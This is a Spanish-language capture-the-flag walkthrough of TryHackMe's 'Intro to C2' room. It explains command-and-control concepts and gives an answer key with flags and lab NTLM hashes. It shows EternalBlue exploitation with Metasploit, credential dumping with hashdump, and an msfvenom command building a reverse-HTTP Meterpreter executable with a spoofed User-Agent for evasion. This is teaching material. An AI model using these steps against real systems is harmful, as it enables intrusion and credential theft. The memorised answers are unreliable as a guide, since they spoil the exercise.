# Intro to C2

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Red Teaming / Teoría + Práctica | introtoc2 | https://tryhackme.com/room/introtoc2 | 02 Level Medium | TryHackMe | Metasploit, msfvenom, Armitage, Apache (mod_rewrite), EternalBlue | Post-explotación / C2 |

---

**Contexto:** **Intro to C2** es una sala de *Red Teaming* que introduce los fundamentos de los frameworks de **Command and Control (C2)**: cómo un **C2 Server** sirve de concentrador al que los **agents** (implantados en las víctimas) llaman periódicamente (**beaconing**) a través de **listeners**. Se estudian las técnicas de evasión de OPSEC (**sleep timers**, **jitter**, ofuscación), los tipos de payload (**stageless** y **staged** con *dropper*), los frameworks más comunes (Metasploit/msfvenom, Armitage, Covenant, Empire, Sliver, Cobalt Strike), los tipos de listener (**HTTP/HTTPS, DNS, SMB**) y los *redirectors* con **Apache mod_rewrite / perfiles maleables**. La parte práctica explota una máquina Windows vulnerable a **MS17-010 (EternalBlue)** con Metasploit para volcar hashes NTLM y leer flags, y termina con la personalización de cabeceras HTTP (`HttpUserAgent`, `HttpHostHeader`) en un payload Meterpreter.

## Solucionario

### Task 1: Introducción
**Explicación:**

1. La sala presenta qué es un framework C2 y sus casos de uso tanto para *Red Teams* como para adversarios avanzados: gestionar equipos comprometidos y facilitar el movimiento lateral.
2. Se repasan los objetivos de aprendizaje (componentes, montaje básico, uso de Armitage/Metasploit, administración y consideraciones OPSEC).

No answer needed

### Task 2: Command and Control Framework Structure
**Explicación:**

1. **C2 Server:** el concentrador al que llaman los *agents*; espera los *callbacks* y distribuye comandos.
2. **Agent:** programa generado por el framework que vive en la víctima y llama de vuelta al *listener*; suele implementar pseudo-comandos (subir/descargar archivos, etc.).
3. **Listener:** aplicación en el C2 server que espera una conexión por un puerto/protocolo concreto (DNS, HTTP, HTTPS, SMB…).
4. **Beacon:** el proceso por el que un *agent* llama al *listener*. El **sleep timer** fija cada cuánto; el **jitter** añade una variación/retardo aleatorio para romper el patrón predecible y evadir detección.
5. **Payloads:** *stageless* (agente completo, llama de inmediato) frente a *staged* (el **dropper** es la primera porción y descarga la *stage 2* desde el C2).

Respuestas:
- Componente en la víctima que llama al C2 → `Agent`
- Opción de beaconing que añade un retardo aleatorio → `Jitter`
- Término para la primera porción de un payload staged → `Dropper`
- Método de comunicación que usa TCP 139/445 y puede dar acceso a un segmento restringido → `SMB Beacon`

### Task 3: Common C2 Frameworks
**Explicación:**

1. La tarea compara frameworks habituales y sus rasgos: **Metasploit** (con su generador `msfvenom`), **Armitage** (GUI sobre Metasploit), **Cobalt Strike**, **Sliver**, **Empire**, **Covenant**, entre otros.
2. Se explica el montaje de un *team server* y cómo acceder a él de forma segura mediante **SSH port-forwarding** cuando escucha en *loopback* (p. ej. Armitage en TCP/55553):
   ```
   ssh -L 55553:127.0.0.1:55553 user@teamserver
   ```
3. Se incide en la administración del framework y las buenas prácticas de OPSEC.

No answer needed

### Task 4: C2 Operation Basics
**Explicación:**

1. Flujo de operación básico: arrancar el C2 server, **crear un listener**, **generar un payload/agent**, entregarlo a la víctima y gestionar la sesión entrante (*beacon*).
2. Se practica la generación de payloads y el manejo de sesiones desde la consola del framework.

No answer needed

### Task 5: Listener Types
**Explicación:**

1. La elección del *listener* depende de las restricciones de red y de los controles defensivos presentes.
2. **DNS:** útil cuando el equipo víctima **no puede acceder fácilmente a Internet** por canales directos, ya que casi todas las redes permiten resolución DNS.
3. **SMB:** para **segmentos de red restringidos**; los *named pipes* SMB permiten *pivoting* entre equipos y que solo uno alcance una salida común.
4. **HTTPS:** frente a **firewalls con inspección de protocolo**, porque cifra el tráfico y dificulta la detección.

Respuestas:
- Equipo que no puede acceder fácilmente a Internet → `DNS`
- Acceso a un segmento de red restringido → `SMB`
- Firewall con inspección de protocolo → `HTTPS`

### Task 6: Command, Control, and Conquer
**Explicación:**

1. **Reconocimiento:** `nmap -A -T4 -p- <IP>` identifica el servicio SMB y su versión vulnerable.
2. **Explotación:** en `msfconsole` se usa el módulo **MS17-010 EternalBlue** (`exploit/windows/smb/ms17_010_eternalblue`) y se configura `RHOSTS`, obteniendo una sesión con privilegios de **NT AUTHORITY\SYSTEM**.
3. **Volcado de credenciales:** con la sesión (Meterpreter) se ejecuta `hashdump`; la segunda parte de cada línea es el **hash NTLM**.
4. **Flags:** con acceso administrativo se localiza el flag del sistema; accediendo a la cuenta del usuario **Ted** (mediante su hash/credenciales) se obtiene el segundo flag y su hash NTLM.

Respuestas:
- Administrator's NTLM hash → `c156d5d108721c5626a6a054d6e0943c`
- Flag tras acceso administrativo → `THM{bd6ea6c871dced619876321081132744}`
- Flag tras acceso a la cuenta de Ted → `THM{217fa45e35f8353ffd04cfc0be28e760}`
- Ted's NTLM hash → `2e2618f266da8867e5664425c1309a5c`

### Task 7: Advanced C2 Setups
**Explicación:**

1. Se estudia el uso de **redirectors/proxies** para separar la infraestructura del C2 real: **NGINX reverse proxy**, **Apache mod_proxy/mod_rewrite** y **Malleable C2 Profiles** permiten controlar elementos concretos de la petición HTTP entrante y responder solo a perfiles legítimos.
2. Ejemplo con Apache: activar `RewriteEngine On`, añadir una `RewriteCond` sobre el *User-Agent* y reenviar con `ProxyPass` hacia Metasploit, de modo que solo las peticiones que imitan el agente esperado lleguen al C2.
3. En Meterpreter/`msfvenom` se personalizan las cabeceras del payload para camuflar el tráfico:
   ```
   msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
   ```

Respuestas:
- Setting que modifica el campo **User Agent** en un payload Meterpreter → `HttpUserAgent`
- Setting que modifica la cabecera **Host** en un payload Meterpreter → `HttpHostHeader`

### Task 8: Conclusion
**Explicación:**

1. La tarea cierra el recorrido repasando los conceptos clave (estructura del framework, tipos de payload, listeners, evasión y *redirectors*).
2. Invita a continuar con salas de Red Teaming más avanzadas y a aplicar consideraciones OPSEC en operaciones reales.

No answer needed

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Introducción | `No answer needed` |
| 2 | Componente en la víctima que llama al C2 | `Agent` |
| 3 | Opción de beaconing con retardo aleatorio | `Jitter` |
| 4 | Término para la primera porción de un payload staged | `Dropper` |
| 5 | Método que usa TCP 139/445 para segmentos restringidos | `SMB Beacon` |
| 6 | Listener si el equipo no accede fácilmente a Internet | `DNS` |
| 7 | Listener para un segmento de red restringido | `SMB` |
| 8 | Listener con firewall que inspecciona protocolos | `HTTPS` |
| 9 | Administrator's NTLM hash | `c156d5d108721c5626a6a054d6e0943c` |
| 10 | Flag tras acceso administrativo | `THM{bd6ea6c871dced619876321081132744}` |
| 11 | Flag de la cuenta de Ted | `THM{217fa45e35f8353ffd04cfc0be28e760}` |
| 12 | Ted's NTLM hash | `2e2618f266da8867e5664425c1309a5c` |
| 13 | Setting para modificar el User Agent | `HttpUserAgent` |
| 14 | Setting para modificar la cabecera Host | `HttpHostHeader` |

---

**Metodología:** Estudio teórico de la arquitectura C2 (server, agent, listener, beacon), de las técnicas de evasión (sleep timers y jitter), de los tipos de payload (stageless vs. staged/dropper) y de los tipos de listener (HTTP/HTTPS, DNS, SMB); práctica guiada con Metasploit/msfvenom y Armitage; explotación de una víctima Windows mediante **MS17-010 EternalBlue**, volcado de hashes NTLM con `hashdump` y obtención de flags; y configuración avanzada de *redirectors* (Apache mod_rewrite / perfiles maleables) y de cabeceras HTTP del payload (`HttpUserAgent`, `HttpHostHeader`).

**Learning chain:** Framework C2 → componentes (Agent/Listener/Beacon) → sleep timer + Jitter → payloads (stageless/staged-dropper) → SMB Beacon → selección de listener (DNS/SMB/HTTPS) → Metasploit (EternalBlue MS17-010) → sesión SYSTEM → `hashdump` NTLM → flags → Apache mod_rewrite/redirector → HttpUserAgent/HttpHostHeader.

**Lección:** *La fuerza de un C2 reside en su capacidad de camuflarse: jitter, ofuscación y cabeceras/proxies personalizados rompen la firma predecible del beacon, mientras que un framework con listeners DNS, SMB y HTTPS permite operar incluso en redes segmentadas o con inspección de protocolo. En defensa, detectar C2 exige vigilar patrones de beaconing, DNS anómalo, named pipes SMB y User-Agents inconsistentes.*

**MITRE ATT&CK:** T1071.001 Application Layer Protocol: Web Protocols · T1071.004 Application Layer Protocol: DNS · T1095 Non-Application Layer Protocol · T1573 Encrypted Channel · T1105 Ingress Tool Transfer · T1021.002 Remote Services: SMB/Windows Admin Shares · T1090 Proxy · T1210 Exploitation of Remote Services · T1003.002 OS Credential Dumping: SAM.

**Fuente:** [TryHackMe - Intro to C2](https://tryhackme.com/room/introtoc2)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
